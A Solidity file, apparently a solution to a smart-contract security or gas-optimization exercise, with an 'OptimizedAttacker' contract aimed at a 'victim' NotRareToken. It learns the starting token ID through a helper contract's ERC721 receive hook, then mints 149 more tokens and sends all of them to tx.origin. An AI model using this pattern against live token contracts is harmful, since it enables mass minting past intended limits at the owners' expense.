//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Mint150.sol";
import "hardhat/console.sol";

contract MintFirstAndGetStartID{
    NotRareToken private token;
    uint public firstTokenID;

    constructor(address victim){
        token = NotRareToken(victim);
    }

    // mint only one NFT, and returns the token ID
    function mint() external returns(uint256){
        token.mint();
        token.transferFrom(address(this),tx.origin, firstTokenID);
        return firstTokenID;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        firstTokenID = tokenId;
        return this.onERC721Received.selector;
    }

}

contract OptimizedAttacker{
    constructor(address victim){
        MintFirstAndGetStartID a = new MintFirstAndGetStartID(victim);
        uint startID = a.mint();

        for(uint i = 1; i < 150; ++i){
            NotRareToken(victim).mint();
        }

        for(uint i = 1; i < 150; ++i){
            NotRareToken(victim).transferFrom(address(this),tx.origin,startID+i);
        }
    }
}